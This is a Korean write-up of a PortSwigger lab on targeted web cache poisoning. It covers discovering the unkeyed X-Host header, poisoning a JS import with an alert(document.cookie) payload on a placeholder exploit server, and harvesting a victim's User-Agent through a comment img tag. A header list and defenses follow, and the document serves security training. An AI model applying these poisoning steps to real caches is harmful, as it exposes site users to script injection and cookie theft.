# Lab: Targeted web cache poisoning using an unknown header

## 개요

- **난이도**: Practitioner
- **주제**: Web Cache Poisoning — 알려지지 않은 unkeyed 헤더(`X-Host`) 탐색 / `Vary: User-Agent` 를 이용한 표적 공격
- **링크**: https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header

## 목표

Param Miner 로 숨은 입력(`X-Host` 헤더)을 찾아 캐시를 오염시키되, `Vary: User-Agent` 로 캐시가 분리되어 있으므로 **피해자의 User-Agent 를 알아내 그 서브셋에만** `alert(document.cookie)` 응답을 제공한다.

## 취약 지점

### 1. 숨은 unkeyed 입력: `X-Host`

```
Param Miner → "Guess headers" 로 발견
  X-Host: example.com
  → 홈 페이지의 JS 임포트 URL 생성에 반영:
     <script src="https://example.com/resources/js/tracking.js"></script>
```

`X-Forwarded-Host` 뿐 아니라 `X-Host` 같은 덜 알려진 헤더도 리버스 프록시/프레임워크가 지원할 수 있다.

### 2. `Vary: User-Agent` 로 캐시가 분리됨

```
Vary: User-Agent
→ 캐시 키에 User-Agent 가 포함됨
→ "모든 사용자" 가 아니라 "특정 User-Agent 를 쓰는 사용자" 에게만 오염 응답이 제공됨
```

따라서 피해자의 User-Agent 를 모르면 오염이 그들에게 전달되지 않는다.

## 공격 단계

### 1단계 — 숨은 헤더 탐색

홈 페이지 `GET /` 을 Param Miner 의 **Guess headers** 로 분석한다.
`X-Host` 가 secret input 임을 확인한다.

### 2단계 — 반영 확인

캐시 버스터와 `X-Host` 를 넣어 JS 임포트 호스트가 바뀌는지 확인한다.

```
GET /?cb=1234
X-Host: example.com
→ <script src="https://example.com/resources/js/tracking.js"></script>
```

### 3단계 — 익스플로잇 서버 준비

```
파일 경로/이름: /resources/js/tracking.js
본문:          alert(document.cookie)
```

### 4단계 — 캐시 오염

```
GET /?cb=1234
X-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

익스플로잇 서버 URL 이 반영되고 `X-Cache: hit` 가 날 때까지 재전송한다.

### 5단계 — 피해자 User-Agent 획득 (표적화)

`Vary: User-Agent` 때문에 피해자와 같은 UA 로 요청해야 한다.
댓글 기능으로 피해자 브라우저가 공격자 서버를 호출하게 만든다.

```html
<img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" />
```

익스플로잇 서버 **Access log** 를 주기적으로 새로고침해 **다른 사용자(피해자)의 요청**을 찾고,
그 요청의 **User-Agent** 값을 복사한다.

### 6단계 — 표적 오염

Repeater 요청에 피해자의 User-Agent 를 넣고 cache-buster 를 제거한 뒤,
`X-Host` + `X-Cache: hit` 가 될 때까지 재전송한다.

```
GET /
User-Agent: <피해자 UA>
X-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

### 7단계 — 유지

피해자가 방문해 랩이 풀릴 때까지 재전송으로 캐시를 계속 오염 상태로 유지한다.

## 알아야 할 헤더 목록 (CDN/리버스 프록시)

알려진 헤더라도 환경에 따라 unkeyed 로 응답에 반영될 수 있으므로 함께 조사한다.

### Host / URL 재정의 계열

```
X-Forwarded-Host      X-Host              X-Forwarded-Server
X-Original-Host       X-Forwarded-Prefix  X-Forwarded-Path
X-Original-URL        X-Rewrite-URL       X-Original-URI
X-Forwarded-URL       Front-End-Host
```

### Scheme / Protocol 계열

```
X-Forwarded-Scheme    X-Forwarded-Proto   X-Forwarded-Protocol
X-Forwarded-SSL       X-Url-Scheme        Front-End-Https
X-Forwarded-Port
```

### Client IP / Forwarded 계열

```
X-Forwarded-For       X-Real-IP           Forwarded
True-Client-IP        X-Client-IP         X-Cluster-Client-IP
```

### Method Override 계열

```
X-HTTP-Method-Override   X-Method-Override   X-Original-Method
```

### CDN / 프록시 벤더 특화

```
Cloudflare : CF-Connecting-IP, CF-Connecting-IPv6, CF-IPCountry, CF-Ray
Akamai     : True-Client-IP, X-Akamai-*, Akamai-Origin-Hop
Fastly     : Fastly-Client-IP, X-Fastly-*, Fastly-SSL
Varnish    : X-Varnish, X-Cache, X-Cache-Hits, X-Served-By
AWS        : X-Amz-* (CloudFront: X-Amz-Cf-Id, CloudFront-Viewer-*)
Nginx/기타 : X-Accel-*, X-Backend, X-Upstream, X-Origin
```

### 캐시 관련(분석용)

```
X-Cache (hit/miss)    X-Cache-Key    Cache-Control    Age    Vary
```

```
[핵심]
  이름이 알려진 헤더라도 "이 사이트가 그 헤더를 응답에 반영하는가" 는 별개다.
  Param Miner 등으로 사이트별로 실제 반영/캐시 여부를 확인해야 한다.
```

## 방어

```
[근본 원인]
  1) 숨은 unkeyed 헤더(X-Host)를 응답(리소스 임포트 URL) 생성에 사용
  2) Vary 로 캐시가 나뉘어도, 공격자가 UA 를 알아내면 표적 오염이 가능
  3) 응답 캐싱

[올바른 방어]
  1. 클라이언트 제공 헤더를 일괄 불신
     - URL/스크립트 임포트/리다이렉트 생성에 헤더 값을 사용하지 않음
     - 정식(canonical) 도메인·scheme 설정값 사용
  2. 프록시 경계에서 X-Forwarded-*/X-Host/X-Original-* 등을 제거/정규화
  3. 캐시 키에 응답 영향 입력을 포함, 불가하면 캐시하지 않음
  4. SRI(서브리소스 무결성)·CSP 로 외부 스크립트 로드 완화
  5. 댓글 등 사용자 콘텐츠의 외부 리소스 삽입 제한, UA 등 메타데이터 과신 금지
  6. "알려지지 않은 헤더" 목록을 정기적으로 점검(Param Miner 등)

[주의]
  Vary 헤더는 "표적화" 를 제공할 뿐 방어가 아니다.
  피해자의 User-Agent 등은 댓글/로그/핑백으로 알아낼 수 있다.
```

## 핵심 정리

- Param Miner 로 숨은 입력 `X-Host` 를 찾아 JS 임포트 URL 호스트를 조작했다.
- `Vary: User-Agent` 때문에, 댓글 + 익스플로잇 서버 로그로 피해자의 User-Agent 를 알아낸 뒤 그 서브셋에만 오염 응답을 제공했다.
- `X-Host`, `X-Forwarded-*`, `X-Original-*`, `X-Rewrite-URL` 등 다양한 프록시 계열 헤더가 unkeyed 로 반영될 수 있다.
- 방어는 헤더 불신(정식 도메인 사용)과 캐시 키/정규화 설계다.

## 배운 점

- 캐시 오염에서 "어떤 헤더가 unkeyed 인가" 를 찾는 것이 핵심이며, Param Miner 같은 자동 탐색이 유용하다.
- `Vary` 는 방어가 아니라 캐시 분리일 뿐이고, 공격자는 피해자 특성(UA)을 알아내 표적화할 수 있다.
- 001~003 에 이어 입력이 헤더 → 쿠키 → 다중 헤더 → **알려지지 않은 헤더**로 확장됐다.
- CDN/리버스 프록시가 사용하는 헤더 목록을 체계적으로 점검하는 것이 실무 캐시 오염 진단의 기본이다.
